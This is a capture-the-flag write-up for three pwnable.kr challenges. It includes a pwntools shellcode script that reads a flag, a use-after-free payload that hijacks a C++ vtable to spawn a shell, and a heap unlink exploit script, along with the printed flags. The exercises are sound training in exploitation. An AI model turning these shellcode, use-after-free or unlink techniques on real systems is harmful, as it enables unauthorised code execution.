 # LEVEL - asm
here we had to write a asm x64 shell script that will open the 
flag read from it and then will write the content to sdtout so instead 
of writing all the assembly we can use pwntools shellcraft that will 
write all the asambly for us that's the code i used to get the flag:
```
from pwn import *
context.arch = 'amd64'
p= remote('pwnable.kr',9026)
p.recvuntil(b'shellcode:')

send = shellcraft.open('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')

send += shellcraft.read('rax','rsp',0x50)

send += shellcraft.write(1,'rsp',0x50)

p.send(asm(send))
get = p.recvline().decode()
print(get)
```
here we conect to pwnable.kr in port 9026 we use shellcraft to make the assembly open code we try to open the flag ( the flag name is relly long)
and than we add to the nessage we will send to the sever to get the flag the assembly cod e of read we use ax as the file discreptor becouse its the register where the return verbels are stored in we store the content of the flag in the stack so we use sp we read 50 byts and than we write what we got from the flag to stdout and in the end we get the flag

 # LEVEL - uaf
 in this level we had to use the mthod use-after-free where we free some space in the heap and than we aloccate memory in the size of the mempry we freed and this memory will go to the same place in the heap here is the code off the program :
 ```
 class Human{
private:
        virtual void give_shell(){
                system("/bin/sh");
        }
protected:
        int age;
        string name;
public:
        virtual void introduce(){
                cout << "My name is " << name << endl;
                cout << "I am " << age << " years old" << endl;
        }
};

class Man: public Human{
public:
        Man(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};

 int main(int argc, char* argv[]){
        Human* m = new Man("Jack", 25);
        Human* w = new Woman("Jill", 21);

        size_t len;
        char* data;
        unsigned int op;
        while(1){
                cout << "1. use\n2. after\n3. free\n";
                cin >> op;

                switch(op){
                       case 1:
                        m->introduce();
                        w->introduce();
                        break;
                       case 2:
                        len = atoi(argv[1]);
                        data = new char[len];
                        read(open(argv[2], O_RDONLY), data, len);
                        cout << "your data is allocated" << endl;
                        break;
                       case 3:
                        delete m;
                        delete w;
                        break;
                       default:
                        break;
                }
        }

        return 0;
}
 ```

so we see that we alocate at the start memory foe the man and women objects and in the loop we can free this memory and we also cat alocate new memory for a string 
when we disassemble the main using gdb we see:

```
mov    rax,QWORD PTR [rbp-0x38]
mov    rax,QWORD PTR [rax]
add    rax,0x8
mov    rdx,QWORD PTR [rax]
mov    rax,QWORD PTR [rbp-0x38]
mov    rdi,rax
call   rdx
```


and this is the place where man and women are stored:

```
            addres         heap       vtabel
man - 0x7fffffffde28 —▸ 0x614ee0 —▸ 0x401570 —▸ 0x40117a (Human::give_shell())
women - 0x7fffffffde30 —▸ 0x614f30 —▸ 0x401550 —▸ 0x40117a (Human::give_shell()) 
```


so we see they point to thire vtabel and the code add 8 to the v tabel to get to the right function with is introduce() but what we can do is free the memory of man and women and than we will alocate memory for the new string in opthion 2 in the swith statment and that string will hold the vtabel addres-8 and this new alocated memory will go to the heap addres of man so when we will try to execute function introduce() the program will go strait to the start of the vtabel and the start of the vtabel holds the function give_shell() so we will get the shell and get the flag 

so i used python2 -c "print('A' * 96 + '\x68\x15\x40\x00\n')" as the string to pass to the new alocated string and the size i sent was 4 becuse the size of the addres is 4 bytes(./uaf 4 python2 -c "print('A' * 96 + '\x68\x15\x40\x00\n')")

the flag is: yay_f1ag_aft3r_pwning

 # LEVEL - unlink
 
 this is the code of the unlink level

```
from pwn import *

p = process("/home/unlink/unlink")


p.recvuntil("leak:")
stack = int(p.recvline().decode()[1:-1],16)
p.recvuntil("leak:")
heap = int(p.recvline().decode()[1:-1],16)

send = b'A' * 16 + p32(heap+36) + p32(stack+16) + b'\xeb\x84\x04\x08'

p.sendline(send)
p.interactive()
```
the flag : conditional_write_what_where_from_unl1nk_explo1t
